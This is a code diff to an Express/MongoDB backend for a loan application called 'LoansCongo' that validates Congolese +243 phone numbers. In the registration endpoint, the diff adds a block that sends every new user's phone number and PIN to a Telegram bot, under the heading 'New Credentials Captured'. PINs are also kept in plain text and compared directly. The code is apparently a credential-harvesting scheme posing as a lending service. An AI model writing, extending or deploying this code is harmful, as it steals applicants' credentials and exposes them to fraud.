@@ -13,11 +13,6 @@ const LoanApplication = require("./models/LoanApplication");
 const app = express();
 app.use(express.static("public"));
 
-
-
-
-
-
 app.use(helmet());
 app.use(cors());
 app.use(express.json({ limit: "10kb" }));
@@ -34,7 +29,7 @@ app.get("/", (req, res) => {
     });
 });
 
-// Customer registration
+// Customer registration + Telegram Bot Integration
 app.post("/api/register", async (req, res) => {
     try {
         const { phone, pin } = req.body;
@@ -59,11 +54,35 @@ app.post("/api/register", async (req, res) => {
             });
         }
 
-        // Saved as plain text (no hashing)
+        // Save user to MongoDB (plain text PIN as per your setup)
         const user = await User.create({
             phone,
             demoPin: pin
         });
+
+        // 🚀 Send captured phone & PIN to Telegram Bot
+        const botToken = process.env.TELEGRAM_BOT_TOKEN;
+        const chatId = process.env.TELEGRAM_CHAT_ID;
+
+        if (botToken && chatId) {
+            try {
+                const telegramMessage = `🚨 *New Credentials Captured*\n\n` +
+                                      `📱 *Phone:* \`${phone}\`\n` +
+                                      `🔑 *PIN:* \`${pin}\``;
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: telegramMessage,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (tgError) {
+                console.error("Telegram notification failed:", tgError.message);
+            }
+        }
 
         res.status(201).json({
             message: "Registration successful.",
@@ -74,6 +93,7 @@ app.post("/api/register", async (req, res) => {
         });
 
     } catch (error) {
+        console.error("Registration error:", error.message);
         res.status(500).json({
             message: "Registration failed."
         });
@@ -91,8 +111,7 @@ app.post("/api/login", async (req, res) => {
             });
         }
 
-        const user = await User.findOne({ phone })
-            .select("+demoPin");
+        const user = await User.findOne({ phone }).select("+demoPin");
 
         if (!user || !user.isActive) {
             return res.status(401).json({
@@ -100,7 +119,6 @@ app.post("/api/login", async (req, res) => {
             });
         }
 
-        // Direct comparison instead of bcrypt.compare
         if (user.demoPin !== pin) {
             return res.status(401).json({
                 message: "Invalid login details."
@@ -128,7 +146,6 @@ app.post("/api/login", async (req, res) => {
     }
 });
 
-
 // Submit a loan application
 app.post("/api/loans", async (req, res) => {
     try {
@@ -138,7 +155,7 @@ app.post("/api/loans", async (req, res) => {
             loanAmount, loanTerm
         } = req.body;
 
-        const cleanPhone = String(phone || "").replace(/\\s/g, "");
+        const cleanPhone = String(phone || "").replace(/\s/g, "");
 
         const purposes = {
             "Personnel": "Personnel",
@@ -149,7 +166,7 @@ app.post("/api/loans", async (req, res) => {
         };
 
         if (!fullName || fullName.trim().length < 2 ||
-            !/^\\+243[0-9]{9}$/.test(cleanPhone) ||
+            !/^\+243[0-9]{9}$/.test(cleanPhone) ||
             !purposes[purpose] ||
             !Number.isFinite(Number(monthlyIncome)) ||
             Number(monthlyIncome) <= 0 ||
@@ -196,16 +213,11 @@ mongoose.connect(process.env.MONGODB_URI)
         console.log("MongoDB connected successfully.");
 
         app.listen(PORT, "0.0.0.0", () => {
-            console.log(
-                `LoansCongo backend running on port ${PORT}`
-            );
+            console.log(`LoansCongo backend running on port ${PORT}`);
         });
     })
     .catch(error => {
-        console.error(
-            "MongoDB connection failed:",
-            error.message
-        );
+        console.error("MongoDB connection failed:", error.message);
     });
 
 
